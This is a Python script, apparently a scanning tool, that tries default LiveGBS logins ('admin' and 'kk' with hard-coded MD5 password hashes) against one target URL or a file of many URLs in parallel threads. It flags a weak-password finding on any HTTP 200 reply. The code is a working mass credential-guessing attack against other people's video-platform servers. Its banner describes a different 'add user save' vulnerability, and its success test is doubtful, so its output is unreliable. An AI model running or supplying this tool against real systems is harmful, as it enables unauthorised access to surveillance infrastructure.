import requests
import argparse
import threading

# name=["admin"]
# passwd=["21232f297a57a5a743894a0e4a801fc3"]
credentials = {
    "kk": "25d55ad283aa400af464c76d713c07ad",
    "admin": "21232f297a57a5a743894a0e4a801fc3"
}

def LiveGBS(url,username,passwordd):
    create_url=url+"/api/v1/login"

    data={"username":username,"password":passwordd}
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
             "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}

    try:
        req=requests.post(create_url,data=data,headers=headers,timeout=5)
        if(req.status_code==200):
            print(f"[+]{url}存在相关弱口令漏洞 (Username: {username}, Password: {passwordd})")
        else:
            print("[-]该网址不存在弱口令")
    except:
        print("[-]该网址无法访问或网络连接错误")

def thread_target(url, username, password):
    LiveGBS(url, username, password)

def LiveGBS_counts(filename):
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url=url.strip()
                for username, password in credentials.items():
                    thread = threading.Thread(target=thread_target, args=(url, username, password))
                    threads.append(thread)
                    thread.start()
            for thread in threads:
                thread.join()
    except:
        print("[-]该文件不存在或打开方式错误")

def start():
        logo = '''
          _      _            _____ ____   _____ 
 | |    (_)          / ____|  _ \ / ____|
 | |     ___   _____| |  __| |_) | (___  
 | |    | \ \ / / _ \ | |_ |  _ < \___ \ 
 | |____| |\ V /  __/ |__| | |_) |____) |
 |______|_| \_/ \___|\_____|____/|_____/ 
    '''
        print(logo)
        print("开始进行关于LiveGBS-添加用户-save漏洞检测")
        print("wirten by YZX100")


def main():
    parser = argparse.ArgumentParser(description="LiveGBS-添加用户-save")
    parser.add_argument('-u',type=str, help='检测单个url')
    parser.add_argument('-f',type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        for username, password in credentials.items():
            thread = threading.Thread(target=thread_target, args=(args.u, username, password))
            thread.start()
            thread.join()
    elif args.f:
        LiveGBS_counts(args.f)
    else:
        parser.print_help()

if __name__ == "__main__":
    start()
    main()